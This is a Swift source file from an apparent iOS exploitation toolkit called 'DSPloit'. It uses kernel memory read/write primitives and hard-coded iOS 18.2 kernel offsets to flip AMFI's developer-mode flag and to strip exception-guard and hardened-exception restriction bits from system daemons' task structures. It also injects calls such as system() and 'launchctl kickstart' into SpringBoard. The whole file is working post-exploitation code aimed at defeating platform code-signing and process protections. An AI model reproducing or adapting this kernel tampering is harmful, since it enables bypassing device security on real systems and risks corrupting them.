//
//  TaskExceptionUnrestrict.swift
//  DSPloit
//
//  Safe AMFI + task exception unrestrict for cryptexd/MSM RC.
//  Only writes confirmed-writable AMFI __DATA bytes and small task flags
//  (never zeroes ipc port pointers — that causes kernel panics).
//

import Foundation

struct TaskExceptionUnrestrictResult {
    let developerModeResolved: Bool
    let excGuardCleared: Bool
    let flagPatches: [(offset: UInt64, before: UInt32, after: UInt32)]
    let processFound: Bool
    let taskAddress: UInt64
}

enum TaskExceptionUnrestrict {

    // Ghidra-verified writable AMFI __DATA (unslid, iOS 18.2 kernelcache)
    private static let unslidAMFIDataBase: UInt64 = 0xfffffff00a330098
    private static let unslidDeveloperModeResolved: UInt64 = 0xfffffff00a330574

    private static let RC_TASK_EXC_GUARD_MP_CORPSE: UInt32 = 0x04000000
    private static let RC_TASK_EXC_GUARD_MP_FATAL: UInt32 = 0x08000000
    private static let RC_TASK_EXC_GUARD_MP_DELIVER: UInt32 = 0x10000000

    typealias LogFn = (String) -> Void

    // MARK: - Public entry

    /// Full safe prep chain for cryptexd TC load.
    @discardableResult
    static func prepareCryptexd(log: @escaping LogFn) -> TaskExceptionUnrestrictResult {
        SafeKRW.reset()
        log("── Safe cryptexd prep (no panic) ──")

        let devOk = setDeveloperModeResolved(log: log)
        wakeCryptexdIfNeeded(log: log)

        let pid = procbyname("cryptexd")
        guard pid > 0 else {
            log("⚠️ cryptexd not running — try kickstart from TC experiment")
            return TaskExceptionUnrestrictResult(
                developerModeResolved: devOk,
                excGuardCleared: false,
                flagPatches: [],
                processFound: false,
                taskAddress: 0
            )
        }

        log("✅ cryptexd PID \(pid)")
        return unrestrictProcess(named: "cryptexd", pid: pid, log: log, devAlreadySet: devOk)
    }

    /// Safe prep for any daemon (cryptexd, MobileStorageMounter, …).
    @discardableResult
    static func unrestrictProcess(
        named processName: String,
        pid: pid_t? = nil,
        log: @escaping LogFn,
        devAlreadySet: Bool = false
    ) -> TaskExceptionUnrestrictResult {
        SafeKRW.reset()

        let resolved = devAlreadySet || setDeveloperModeResolved(log: log)

        let actualPid = pid ?? procbyname(processName)
        guard actualPid > 0 else {
            log("❌ \(processName) not found")
            return TaskExceptionUnrestrictResult(
                developerModeResolved: resolved,
                excGuardCleared: false,
                flagPatches: [],
                processFound: false,
                taskAddress: 0
            )
        }

        let proc = procbypid(actualPid)
        guard proc != 0 else {
            log("❌ proc lookup failed for \(processName)")
            return TaskExceptionUnrestrictResult(
                developerModeResolved: resolved,
                excGuardCleared: false,
                flagPatches: [],
                processFound: true,
                taskAddress: 0
            )
        }

        let task = taskbyproc(proc)
        guard task != 0 else {
            log("❌ task lookup failed for \(processName)")
            return TaskExceptionUnrestrictResult(
                developerModeResolved: resolved,
                excGuardCleared: false,
                flagPatches: [],
                processFound: true,
                taskAddress: 0
            )
        }

        log("task @ 0x\(String(task, radix: 16))")

        let excOk = clearExcGuardSafely(task: task, log: log)
        let patches = clearHardenedExceptionFlagsSafely(targetTask: task, log: log)

        SafeKRW.settle()

        return TaskExceptionUnrestrictResult(
            developerModeResolved: resolved,
            excGuardCleared: excOk,
            flagPatches: patches,
            processFound: true,
            taskAddress: task
        )
    }

    /// Test RC connect without TC load.
    static func testRemoteCall(
        serviceName: String,
        processName: String,
        log: @escaping LogFn,
        completion: @escaping (Bool) -> Void
    ) {
        var connected = false
        let sem = DispatchSemaphore(value: 0)

        dspmgr.shared.rcinitDaemon(
            serviceName: serviceName,
            framework: nil,
            process: processName,
            migbypass: false
        ) { rc in
            if rc != nil {
                connected = true
                log("✅ RC connected to \(processName) (pid=\(rc?.pid ?? 0))")
                rc?.destroy()
            } else {
                let err = RemoteCall.lastInitError() ?? "unknown"
                log("❌ RC failed: \(err)")
            }
            sem.signal()
        }

        DispatchQueue.global().async {
            _ = sem.wait(timeout: .now() + 30)
            completion(connected)
        }
    }

    // MARK: - AMFI developer_mode_resolved

    @discardableResult
    static func setDeveloperModeResolved(log: @escaping LogFn) -> Bool {
        let slide = ds_get_kernel_slide()
        let addr = unslidDeveloperModeResolved &+ slide
        let before = SafeKRW.read8(addr)

        if before == 1 {
            log("developer_mode_resolved already 1 ✅")
            return true
        }

        SafeKRW.write8(addr, 1)
        let after = SafeKRW.read8(addr)
        let ok = (after == 1)
        log("\(ok ? "✅" : "❌") developer_mode_resolved: \(before) → \(after)")
        return ok
    }

    // MARK: - exc_guard (proven safe — same as amfid path)

    @discardableResult
    private static func clearExcGuardSafely(task: UInt64, log: @escaping LogFn) -> Bool {
        guard off_task_task_exc_guard != 0 else {
            log("⚠️ off_task_task_exc_guard unknown — skip")
            return false
        }

        let addr = task + UInt64(off_task_task_exc_guard)
        let before = SafeKRW.read32(addr)

        // Reject if high 16 bits look corrupt (RemoteCall.m guard)
        if before & 0xffff0000 != 0 && before & 0xffff0000 != 0xffff0000 {
            log("⚠️ exc_guard looks invalid (0x\(String(before, radix: 16))) — skip write")
            return false
        }

        var after = before
        after &= ~(RC_TASK_EXC_GUARD_MP_CORPSE | RC_TASK_EXC_GUARD_MP_FATAL)
        after |= RC_TASK_EXC_GUARD_MP_DELIVER

        if after == before {
            log("exc_guard already deliver-only ✅")
            return true
        }

        SafeKRW.write32(addr, after)
        let verify = SafeKRW.read32(addr)
        let ok = (verify & (RC_TASK_EXC_GUARD_MP_CORPSE | RC_TASK_EXC_GUARD_MP_FATAL) == 0)
            && (verify & RC_TASK_EXC_GUARD_MP_DELIVER != 0)
        log("\(ok ? "✅" : "⚠️") exc_guard: 0x\(String(before, radix: 16)) → 0x\(String(verify, radix: 16))")
        return ok
    }

    // MARK: - hardened_exception_action flags (gentle — uint32 only, no port zero)

    /// Compare target task against launchd (RC-always-works reference).
    /// Only clears small uint32 flag fields — never touches ipc port pointers.
    private static func clearHardenedExceptionFlagsSafely(
        targetTask: UInt64,
        log: @escaping LogFn
    ) -> [(offset: UInt64, before: UInt32, after: UInt32)] {
        var refPid = procbyname("launchd")
        if refPid <= 0 { refPid = 1 }
        guard refPid > 0 else {
            log("⚠️ launchd reference not found — skip flag diff")
            return []
        }

        let refProc = procbypid(refPid)
        let refTask = taskbyproc(refProc)
        guard refTask != 0 else {
            log("⚠️ launchd task not found — skip flag diff")
            return []
        }

        log("Reference task (launchd) @ 0x\(String(refTask, radix: 16))")

        // Scan window: after itk_space (~0x300) through exception port array
        let scanStart: UInt64 = 0x180
        let scanEnd: UInt64 = 0x580
        let maxPatches = 4

        var candidates: [(offset: UInt64, target: UInt32, ref: UInt32, score: Int)] = []

        var offset = scanStart
        while offset < scanEnd {
            if isPointerField(task: targetTask, offset: offset)
                || isPointerField(task: refTask, offset: offset) {
                offset += 8
                continue
            }

            let targetVal = SafeKRW.read32(targetTask + offset)
            let refVal = SafeKRW.read32(refTask + offset)

            if let score = scoreFlagCandidate(target: targetVal, reference: refVal) {
                candidates.append((offset, targetVal, refVal, score))
            }

            offset += 4
        }

        candidates.sort { $0.score > $1.score }

        var applied: [(offset: UInt64, before: UInt32, after: UInt32)] = []

        for cand in candidates.prefix(maxPatches) {
            guard cand.target != 0 else { continue }

            // Gentle: clear restriction bits only (lower 16 bits), keep upper intact
            let newVal = cand.target & 0xffff0000
            if newVal == cand.target { continue }

            SafeKRW.write32(targetTask + cand.offset, newVal)
            let verify = SafeKRW.read32(targetTask + cand.offset)

            log("🔧 task+0x\(String(cand.offset, radix: 16)): 0x\(String(cand.target, radix: 16)) → 0x\(String(verify, radix: 16)) (ref=0x\(String(cand.ref, radix: 16)))")

            if verify == newVal {
                applied.append((cand.offset, cand.target, verify))
            }
        }

        if applied.isEmpty {
            log("ℹ️ No safe hardened-exception flag candidates patched")
            log("   (ports left untouched — avoids panic)")
        } else {
            log("✅ Patched \(applied.count) flag field(s), no port pointers zeroed")
        }

        return applied
    }

    /// Returns nil if offset should not be treated as a flags field.
    private static func scoreFlagCandidate(target: UInt32, reference: UInt32) -> Int? {
        guard target != reference else { return nil }
        guard target != 0 else { return nil }

        // Flag-like: small values or structured high-half + low flags
        let targetLow = target & 0xffff
        let refLow = reference & 0xffff
        guard targetLow != 0 else { return nil }
        guard target <= 0x00ffffff || (target & 0xffff0000) != 0 else { return nil }

        // Prefer fields where launchd has fewer restriction bits
        if refLow == 0 && targetLow != 0 { return 100 + Int(targetLow) }
        if targetLow & ~refLow != 0 { return 50 + Int(targetLow & ~refLow) }
        return nil
    }

    private static func isPointerField(task: UInt64, offset: UInt64) -> Bool {
        let raw = SafeKRW.read64(task + offset)
        return looksLikeKernelPointer(raw)
    }

    private static func looksLikeKernelPointer(_ raw: UInt64) -> Bool {
        if raw == 0 { return false }
        let stripped = raw & 0x0000007FFFFFFFFF
        // iOS kernel heap/text canonical range
        if stripped >= 0xffffffe000000000 && stripped <= 0xffffffffffffffff {
            return true
        }
        if stripped >= 0xfffffff000000000 {
            return true
        }
        return false
    }

    // MARK: - Wake cryptexd

    private static func wakeCryptexdIfNeeded(log: @escaping LogFn) {
        if procbyname("cryptexd") > 0 {
            log("cryptexd already running")
            return
        }

        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            log("⚠️ No SpringBoard RC to wake cryptexd")
            return
        }

        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "xpc_connection_resume"))

        if xpcCreate != 0 && xpcResume != 0 {
            let svcName = remote_alloc_str(sb, "com.apple.cryptexd")
            let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcName, 0, 0)
            RootExecutor.rcall(sb, "free", svcName)
            if conn != 0 {
                RootExecutor.rcallAddr(sb, xpcResume, conn)
                log("✅ cryptexd XPC wake sent")
                SafeKRW.settle(ms: 500_000)
                return
            }
        }

        let system = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "system"))
        if system != 0 {
            let cmd = remote_alloc_str(sb, "launchctl kickstart system/com.apple.cryptexd")
            RootExecutor.rcallAddr(sb, system, cmd)
            RootExecutor.rcall(sb, "free", cmd)
            log("kickstart cryptexd via launchctl")
        }
        SafeKRW.settle(ms: 500_000)
        #endif
    }
}
